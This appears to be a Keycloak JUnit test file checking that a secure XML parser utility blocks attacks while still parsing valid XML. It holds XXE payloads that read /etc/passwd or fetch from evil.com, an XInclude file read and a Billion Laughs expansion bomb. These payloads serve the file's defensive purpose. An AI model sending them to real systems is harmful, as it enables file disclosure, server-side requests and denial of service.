/*
 * Copyright 2024 Red Hat, Inc. and/or its affiliates
 * and other contributors as indicated by the @author tags.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.keycloak.common.util.security;

import org.junit.Test;
import org.junit.Before;
import org.junit.After;
import org.w3c.dom.Document;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.StringReader;
import java.nio.charset.StandardCharsets;

import static org.junit.Assert.*;

/**
 * Comprehensive TDD test suite for XmlSecurityUtil.
 *
 * This test class validates that the XmlSecurityUtil properly protects against:
 * - XXE (XML External Entity) injection attacks
 * - XML Entity Expansion (Billion Laughs) attacks
 * - DTD processing attacks
 * - External resource loading
 *
 * Test methodology follows Test-Driven Development (TDD) principles:
 * 1. Test first - Define expected secure behavior
 * 2. Verify protection - Ensure attacks are blocked
 * 3. Validate functionality - Ensure legitimate XML still works
 *
 * @author Keycloak Security Team
 * @version 1.0
 */
public class XmlSecurityUtilTest {

    private static final String SAFE_XML = "<?xml version=\"1.0\"?><root><element>Safe Content</element></root>";

    // XXE Attack Payloads
    private static final String XXE_FILE_DISCLOSURE =
        "<?xml version=\"1.0\"?>" +
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" +
        "<root>&xxe;</root>";

    private static final String XXE_HTTP_REQUEST =
        "<?xml version=\"1.0\"?>" +
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/malicious\">]>" +
        "<root>&xxe;</root>";

    private static final String XXE_PARAMETER_ENTITY =
        "<?xml version=\"1.0\"?>" +
        "<!DOCTYPE foo [" +
        "<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">" +
        "%xxe;" +
        "]>" +
        "<root>test</root>";

    // Billion Laughs Attack (XML Entity Expansion)
    private static final String BILLION_LAUGHS_ATTACK =
        "<?xml version=\"1.0\"?>" +
        "<!DOCTYPE lolz [" +
        "<!ENTITY lol \"lol\">" +
        "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">" +
        "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">" +
        "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">" +
        "]>" +
        "<root>&lol3;</root>";

    // XInclude Attack
    private static final String XINCLUDE_ATTACK =
        "<?xml version=\"1.0\"?>" +
        "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\">" +
        "<xi:include href=\"file:///etc/passwd\" parse=\"text\"/>" +
        "</root>";

    @Before
    public void setUp() {
        // Setup code if needed
    }

    @After
    public void tearDown() {
        // Cleanup code if needed
    }

    /**
     * Test: Verify that a secure DocumentBuilderFactory is created successfully.
     * Expected: Factory is created with XXE protection enabled.
     */
    @Test
    public void testCreateSecureDocumentBuilderFactory() throws ParserConfigurationException {
        DocumentBuilderFactory factory = XmlSecurityUtil.createSecureDocumentBuilderFactory();

        assertNotNull("DocumentBuilderFactory should not be null", factory);
        assertFalse("XInclude should be disabled", factory.isXIncludeAware());
        assertFalse("Entity expansion should be disabled", factory.isExpandEntityReferences());
    }

    /**
     * Test: Verify that a secure DocumentBuilder is created successfully.
     * Expected: Builder is created and can parse safe XML.
     */
    @Test
    public void testCreateSecureDocumentBuilder() throws ParserConfigurationException, SAXException, IOException {
        DocumentBuilder builder = XmlSecurityUtil.createSecureDocumentBuilder();

        assertNotNull("DocumentBuilder should not be null", builder);

        // Verify it can parse safe XML
        InputStream safeXmlStream = new ByteArrayInputStream(SAFE_XML.getBytes(StandardCharsets.UTF_8));
        Document doc = builder.parse(safeXmlStream);

        assertNotNull("Document should be parsed successfully", doc);
        assertEquals("Root element should be 'root'", "root", doc.getDocumentElement().getNodeName());
    }

    /**
     * Test: Verify that XXE file disclosure attack is blocked.
     * Expected: SAXException or empty content (attack blocked).
     */
    @Test
    public void testBlockXXEFileDisclosure() throws ParserConfigurationException {
        DocumentBuilder builder = XmlSecurityUtil.createSecureDocumentBuilder();

        try {
            InputStream xxeStream = new ByteArrayInputStream(XXE_FILE_DISCLOSURE.getBytes(StandardCharsets.UTF_8));
            Document doc = builder.parse(xxeStream);

            // If parsing succeeds, verify that entity was NOT expanded
            String content = doc.getDocumentElement().getTextContent();
            assertFalse("XXE entity should not be expanded - file content should not appear",
                    content.contains("root:") || content.contains("/bin/bash"));

            // Content should be empty or just whitespace
            assertTrue("Content should be empty or minimal after XXE block",
                    content == null || content.trim().isEmpty() || content.trim().length() < 10);

        } catch (SAXException | IOException e) {
            // Expected: Parser should reject DOCTYPE or external entities
            // This is the preferred outcome
            assertTrue("Exception message should indicate DOCTYPE or external entity rejection",
                    e.getMessage().contains("DOCTYPE") ||
                    e.getMessage().contains("entity") ||
                    e.getMessage().contains("external"));
        }
    }

    /**
     * Test: Verify that XXE HTTP request attack is blocked.
     * Expected: SAXException or no network request made.
     */
    @Test
    public void testBlockXXEHttpRequest() throws ParserConfigurationException {
        DocumentBuilder builder = XmlSecurityUtil.createSecureDocumentBuilder();

        try {
            InputStream xxeStream = new ByteArrayInputStream(XXE_HTTP_REQUEST.getBytes(StandardCharsets.UTF_8));
            Document doc = builder.parse(xxeStream);

            // If parsing succeeds, verify that entity was NOT expanded
            String content = doc.getDocumentElement().getTextContent();
            assertFalse("XXE entity should not be expanded - HTTP content should not appear",
                    content.contains("http") || content.contains("evil"));

            assertTrue("Content should be empty or minimal after XXE block",
                    content == null || content.trim().isEmpty() || content.trim().length() < 10);

        } catch (SAXException | IOException e) {
            // Expected: Parser should reject DOCTYPE or external entities
            assertTrue("Exception message should indicate security protection",
                    e.getMessage().contains("DOCTYPE") ||
                    e.getMessage().contains("entity") ||
                    e.getMessage().contains("external"));
        }
    }

    /**
     * Test: Verify that parameter entity XXE attack is blocked.
     * Expected: SAXException or attack is neutralized.
     */
    @Test
    public void testBlockParameterEntityXXE() throws ParserConfigurationException {
        DocumentBuilder builder = XmlSecurityUtil.createSecureDocumentBuilder();

        try {
            InputStream xxeStream = new ByteArrayInputStream(XXE_PARAMETER_ENTITY.getBytes(StandardCharsets.UTF_8));
            Document doc = builder.parse(xxeStream);

            // If parsing succeeds, the parameter entity should not have been processed
            assertNotNull("Document should exist", doc);

        } catch (SAXException | IOException e) {
            // Expected: Parser should reject DOCTYPE or external parameter entities
            assertTrue("Exception should indicate security protection",
                    e.getMessage().contains("DOCTYPE") ||
                    e.getMessage().contains("entity") ||
                    e.getMessage().contains("external"));
        }
    }

    /**
     * Test: Verify that Billion Laughs attack is blocked.
     * Expected: SAXException or entity expansion is disabled.
     */
    @Test
    public void testBlockBillionLaughsAttack() throws ParserConfigurationException {
        DocumentBuilder builder = XmlSecurityUtil.createSecureDocumentBuilder();

        try {
            InputStream attackStream = new ByteArrayInputStream(BILLION_LAUGHS_ATTACK.getBytes(StandardCharsets.UTF_8));
            Document doc = builder.parse(attackStream);

            // If parsing succeeds, verify entities were NOT recursively expanded
            String content = doc.getDocumentElement().getTextContent();
            // Content should not be the expanded "lol" repeated many times
            assertTrue("Billion Laughs attack should be blocked",
                    content == null || content.trim().isEmpty() || content.length() < 100);

        } catch (SAXException | IOException e) {
            // Expected: Parser should reject DOCTYPE or prevent expansion
            assertTrue("Exception should indicate security protection",
                    e.getMessage().contains("DOCTYPE") ||
                    e.getMessage().contains("entity") ||
                    e.getMessage().contains("expansion"));
        }
    }

    /**
     * Test: Verify that XInclude attack is blocked.
     * Expected: XInclude processing is disabled.
     */
    @Test
    public void testBlockXIncludeAttack() throws ParserConfigurationException {
        DocumentBuilder builder = XmlSecurityUtil.createSecureDocumentBuilder();

        try {
            InputStream attackStream = new ByteArrayInputStream(XINCLUDE_ATTACK.getBytes(StandardCharsets.UTF_8));
            Document doc = builder.parse(attackStream);

            // XInclude should be disabled, so xi:include should not be processed
            String content = doc.getDocumentElement().getTextContent();
            assertFalse("XInclude should not process file inclusion",
                    content.contains("root:") || content.contains("/bin/bash"));

        } catch (SAXException | IOException e) {
            // May throw exception depending on implementation
            // Either outcome (blocked XInclude or exception) is acceptable
        }
    }

    /**
     * Test: Verify that safe XML can still be parsed successfully.
     * Expected: Safe XML is parsed without issues.
     */
    @Test
    public void testParseSafeXml() throws ParserConfigurationException, SAXException, IOException {
        Document doc = XmlSecurityUtil.parseXmlDocument(SAFE_XML);

        assertNotNull("Document should be parsed", doc);
        assertEquals("Root element should be 'root'", "root", doc.getDocumentElement().getNodeName());
        assertEquals("Element content should be preserved", "Safe Content",
                doc.getElementsByTagName("element").item(0).getTextContent());
    }

    /**
     * Test: Verify parseXmlDocument with InputStream works correctly.
     * Expected: Document is parsed from InputStream.
     */
    @Test
    public void testParseXmlDocumentFromInputStream() throws Exception {
        InputStream inputStream = new ByteArrayInputStream(SAFE_XML.getBytes(StandardCharsets.UTF_8));
        Document doc = XmlSecurityUtil.parseXmlDocument(inputStream);

        assertNotNull("Document should be parsed from InputStream", doc);
        assertEquals("Root element should be 'root'", "root", doc.getDocumentElement().getNodeName());
    }

    /**
     * Test: Verify parseXmlDocument with Reader works correctly.
     * Expected: Document is parsed from Reader.
     */
    @Test
    public void testParseXmlDocumentFromReader() throws Exception {
        StringReader reader = new StringReader(SAFE_XML);
        Document doc = XmlSecurityUtil.parseXmlDocument(reader);

        assertNotNull("Document should be parsed from Reader", doc);
        assertEquals("Root element should be 'root'", "root", doc.getDocumentElement().getNodeName());
    }

    /**
     * Test: Verify parseXmlDocument with String works correctly.
     * Expected: Document is parsed from String.
     */
    @Test
    public void testParseXmlDocumentFromString() throws Exception {
        Document doc = XmlSecurityUtil.parseXmlDocument(SAFE_XML);

        assertNotNull("Document should be parsed from String", doc);
        assertEquals("Root element should be 'root'", "root", doc.getDocumentElement().getNodeName());
    }

    /**
     * Test: Verify that SAXParser is created securely.
     * Expected: SAXParser is created with XXE protection.
     */
    @Test
    public void testCreateSecureSAXParser() throws Exception {
        SAXParser parser = XmlSecurityUtil.createSecureSAXParser();

        assertNotNull("SAXParser should be created", parser);
        assertFalse("XInclude should be disabled",
                parser.getXMLReader().getFeature("http://apache.org/xml/features/xinclude"));
    }

    /**
     * Test: Verify that SAXParserFactory is created securely.
     * Expected: SAXParserFactory has XXE protection enabled.
     */
    @Test
    public void testCreateSecureSAXParserFactory() throws Exception {
        SAXParserFactory factory = XmlSecurityUtil.createSecureSAXParserFactory();

        assertNotNull("SAXParserFactory should be created", factory);
        assertFalse("XInclude should be disabled", factory.isXIncludeAware());
    }

    /**
     * Test: Verify that XMLReader is created securely.
     * Expected: XMLReader is created with XXE protection.
     */
    @Test
    public void testCreateSecureXMLReader() throws Exception {
        org.xml.sax.XMLReader reader = XmlSecurityUtil.createSecureXMLReader();

        assertNotNull("XMLReader should be created", reader);
        assertNotNull("EntityResolver should be set", reader.getEntityResolver());
    }

    /**
     * Test: Verify malformed XML is properly rejected.
     * Expected: SAXException for malformed XML.
     */
    @Test(expected = SAXException.class)
    public void testRejectMalformedXml() throws Exception {
        String malformedXml = "<?xml version=\"1.0\"?><root><unclosed>";
        XmlSecurityUtil.parseXmlDocument(malformedXml);
    }

    /**
     * Test: Verify null input is handled gracefully.
     * Expected: Appropriate exception for null input.
     */
    @Test(expected = NullPointerException.class)
    public void testNullInputHandling() throws Exception {
        XmlSecurityUtil.parseXmlDocument((String) null);
    }

    /**
     * Test: Verify empty XML is handled correctly.
     * Expected: SAXException for empty content.
     */
    @Test(expected = SAXException.class)
    public void testEmptyXmlHandling() throws Exception {
        XmlSecurityUtil.parseXmlDocument("");
    }

    /**
     * Integration test: Verify that complex valid XML can be parsed.
     * Expected: Complex XML structure is preserved correctly.
     */
    @Test
    public void testParseComplexValidXml() throws Exception {
        String complexXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<catalog>" +
                "  <book id=\"bk101\">" +
                "    <author>Gambardella, Matthew</author>" +
                "    <title>XML Developer's Guide</title>" +
                "    <genre>Computer</genre>" +
                "    <price>44.95</price>" +
                "  </book>" +
                "  <book id=\"bk102\">" +
                "    <author>Ralls, Kim</author>" +
                "    <title>Midnight Rain</title>" +
                "    <genre>Fantasy</genre>" +
                "    <price>5.95</price>" +
                "  </book>" +
                "</catalog>";

        Document doc = XmlSecurityUtil.parseXmlDocument(complexXml);

        assertNotNull("Complex XML should be parsed", doc);
        assertEquals("Root should be catalog", "catalog", doc.getDocumentElement().getNodeName());
        assertEquals("Should have 2 books", 2, doc.getElementsByTagName("book").getLength());
        assertEquals("First book author should be correct", "Gambardella, Matthew",
                doc.getElementsByTagName("author").item(0).getTextContent());
    }

    /**
     * Performance test: Verify that secure parsing doesn't significantly degrade performance.
     * Expected: Parsing completes in reasonable time.
     */
    @Test(timeout = 5000) // Should complete within 5 seconds
    public void testSecureParsingPerformance() throws Exception {
        StringBuilder largeXml = new StringBuilder("<?xml version=\"1.0\"?><root>");
        for (int i = 0; i < 1000; i++) {
            largeXml.append("<item id=\"").append(i).append("\">Content ").append(i).append("</item>");
        }
        largeXml.append("</root>");

        Document doc = XmlSecurityUtil.parseXmlDocument(largeXml.toString());

        assertNotNull("Large XML should be parsed efficiently", doc);
        assertEquals("Should have 1000 items", 1000, doc.getElementsByTagName("item").getLength());
    }
}
